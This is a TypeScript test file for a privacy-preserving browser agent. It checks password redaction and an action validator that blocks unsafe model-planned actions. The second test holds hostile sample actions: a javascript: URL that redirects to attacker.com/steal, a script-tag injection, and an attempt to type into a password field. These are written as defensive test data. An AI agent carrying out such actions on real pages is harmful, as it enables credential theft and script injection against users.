import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { PrivacyEngine } from '../privacy/PrivacyEngine';
import { TransmissionGate } from '../network/TransmissionGate';
import { RemoteContextClient } from '../network/RemoteContextClient';
import { validateAction } from '../background/actionValidator';
import { executeAction } from '../content/executor';
import { RawContext, RawDOM, DOMElement } from '../types';

describe('End-to-End Real Agent Workflow Loop Test', () => {
  let originalFetch: typeof globalThis.fetch;
  const originalOffscreenCanvas = globalThis.OffscreenCanvas;
  const originalCreateImageBitmap = globalThis.createImageBitmap;

  beforeEach(() => {
    // Setup deterministic demo page DOM
    document.body.innerHTML = `
      <div id="app">
        <h1>Welcome to PrivAI Demo Portal</h1>
        <label for="username">Username</label>
        <input id="username" data-agent-id="agent-user-0" type="text" value="" />
        
        <label for="password">Password</label>
        <input id="password" data-agent-id="agent-pwd-1" type="password" value="HiddenSecret123" />
        
        <button id="login-btn" data-agent-id="agent-btn-2">Log In</button>
        <div id="status-message"></div>
      </div>
    `;

    (globalThis as any).OffscreenCanvas = class {
      public width: number;
      public height: number;
      constructor(w: number, h: number) {
        this.width = w;
        this.height = h;
      }
      getContext() {
        return {
          fillRect() {},
          drawImage() {},
          save() {},
          restore() {},
          beginPath() {},
          rect() {},
          clip() {},
        };
      }
      async convertToBlob() {
        return new Blob(['sanitized-pixels'], { type: 'image/png' });
      }
    };

    (globalThis as any).createImageBitmap = vi.fn().mockResolvedValue({
      width: 300,
      height: 150,
    });

    originalFetch = globalThis.fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
    globalThis.OffscreenCanvas = originalOffscreenCanvas;
    globalThis.createImageBitmap = originalCreateImageBitmap;
  });

  it('runs complete lifecycle: Observe -> Sanitize -> Gate -> Plan -> Validate -> Execute -> Page Mutates', async () => {
    const loginBtn = document.getElementById('login-btn') as HTMLButtonElement;
    const userInput = document.getElementById('username') as HTMLInputElement;
    const pwdInput = document.getElementById('password') as HTMLInputElement;
    const statusDiv = document.getElementById('status-message') as HTMLDivElement;

    loginBtn.addEventListener('click', () => {
      statusDiv.textContent = `Submitted with user: ${userInput.value}`;
    });

    // 1. Observation Phase (Raw DOM & Screenshot)
    const rawElements: DOMElement[] = [
      {
        id: 'username',
        element_id: 'agent-user-0',
        tag: 'input',
        type: 'text',
        role: 'textbox',
        text: '',
        label: 'Username',
        bbox: { x: 50, y: 100, width: 200, height: 35 },
        visible: true,
        interactive: true,
        enabled: true,
        highlightIndex: 1,
      },
      {
        id: 'password',
        element_id: 'agent-pwd-1',
        tag: 'input',
        type: 'password',
        input_type: 'password',
        role: 'textbox',
        text: 'HiddenSecret123',
        label: 'Password',
        bbox: { x: 50, y: 150, width: 200, height: 35 },
        visible: true,
        interactive: true,
        enabled: true,
        highlightIndex: 2,
      },
      {
        id: 'login-btn',
        element_id: 'agent-btn-2',
        tag: 'button',
        type: 'submit',
        role: 'button',
        text: 'Log In',
        label: 'Log In',
        bbox: { x: 50, y: 200, width: 120, height: 40 },
        visible: true,
        interactive: true,
        enabled: true,
        highlightIndex: 3,
      },
    ];

    const rawDOM: RawDOM = {
      __brand: 'RawDOM',
      url: 'https://portal.privai.local/login',
      title: 'PrivAI Demo Portal',
      timestamp: Date.now(),
      elements: rawElements,
    };

    const rawContext: RawContext = {
      __brand: 'RawContext',
      screenshot: new Blob(['raw-login-screenshot'], { type: 'image/png' }) as any,
      dom: rawDOM,
    };

    // 2. Local Privacy Processing (Detect -> Canonical Merge -> Redact DOM & Screenshot)
    const privacyEngine = new PrivacyEngine();
    const sanitizedContext = await privacyEngine.process(rawContext);

    // Verify raw secret password NEVER appears in sanitized context
    expect(sanitizedContext.dom.elements[1].text).toBe('[REDACTED]');
    expect((sanitizedContext.dom.elements[1] as any).value).toBe('[REDACTED]');

    // 3. Authoritative Hard Transmission Gate Verification
    expect(() => TransmissionGate.assertSafeToTransmit(sanitizedContext)).not.toThrow();

    // 4. Remote Context Transmission (Mocked Backend Roundtrip returning strict Action)
    let planCalls = 0;
    globalThis.fetch = vi.fn().mockImplementation(async (url: string) => {
      if (url.includes('/api/agent/plan')) {
        planCalls++;
        if (planCalls === 1) {
          // Step 1: Type username
          return {
            ok: true,
            status: 200,
            json: async () => ({
              action: { action: 'type', target: 'agent-user-0', text: 'AliceEngineer' },
              reasoning: 'Input username into detected text field',
              confidence: 0.95,
            }),
          };
        } else {
          // Step 2: Click submit
          return {
            ok: true,
            status: 200,
            json: async () => ({
              action: { action: 'click', target: 'agent-btn-2' },
              reasoning: 'Click login button to submit credentials',
              confidence: 0.98,
            }),
          };
        }
      }
      return { ok: true, status: 200, json: async () => ({}) };
    }) as any;

    const remoteClient = new RemoteContextClient('http://localhost:8000');

    // Step 1 execution
    const step1Response = await remoteClient.plan(sanitizedContext, 'Log in as AliceEngineer');
    expect(step1Response.action.action).toBe('type');

    // 5. Client Action Validation
    validateAction(step1Response.action, sanitizedContext.dom.elements);

    // 6. Browser Execution on Real DOM
    await executeAction(step1Response.action);
    // Assert page actually changed!
    expect(userInput.value).toBe('AliceEngineer');

    // Step 2 execution
    const step2Response = await remoteClient.plan(sanitizedContext, 'Log in as AliceEngineer');
    expect(step2Response.action.action).toBe('click');

    validateAction(step2Response.action, sanitizedContext.dom.elements);
    await executeAction(step2Response.action);

    // Assert form submission event fired and changed status message!
    expect(statusDiv.textContent).toBe('Submitted with user: AliceEngineer');
  });

  it('fails safely and blocks arbitrary script injection or password typing returned by VLM', async () => {
    const rawElements: DOMElement[] = [
      {
        id: 'pwd-field',
        element_id: 'agent-pwd-1',
        tag: 'input',
        type: 'password',
        input_type: 'password',
        role: 'textbox',
        text: '[REDACTED]',
        label: 'Password',
        bbox: { x: 50, y: 150, width: 200, height: 35 },
        visible: true,
        interactive: true,
        enabled: true,
        highlightIndex: 1,
      },
    ];

    // Attack 1: VLM attempts to type into password field
    const maliciousTypeAction = { action: 'type' as const, target: 'agent-pwd-1', text: 'Stolen123' };
    expect(() => validateAction(maliciousTypeAction, rawElements)).toThrow(/Typing into password fields is prohibited/);

    // Attack 2: VLM attempts to execute javascript: URL
    const maliciousNavAction = { action: 'navigate' as const, url: 'javascript:document.location="https://attacker.com/steal"' };
    expect(() => validateAction(maliciousNavAction, rawElements)).toThrow(/JavaScript execution is blocked/);

    // Attack 3: VLM attempts to inject script tags
    const maliciousScriptAction = { action: 'type' as const, target: 'agent-pwd-1', text: '<script>alert(1)</script>' };
    expect(() => validateAction(maliciousScriptAction, rawElements)).toThrow(/JavaScript execution is blocked/);
  });
});
